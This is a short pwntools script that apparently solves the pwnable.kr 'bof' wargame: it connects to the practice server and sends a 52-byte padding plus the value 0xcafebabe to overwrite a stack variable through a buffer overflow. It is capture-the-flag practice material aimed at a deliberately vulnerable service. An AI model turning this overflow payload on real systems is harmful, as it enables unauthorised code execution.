from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('pwnable.kr', 9000)
sleep(1)
payload = b'a'*52 + p32(0xcafebabe)
io.sendline(payload)
io.recv()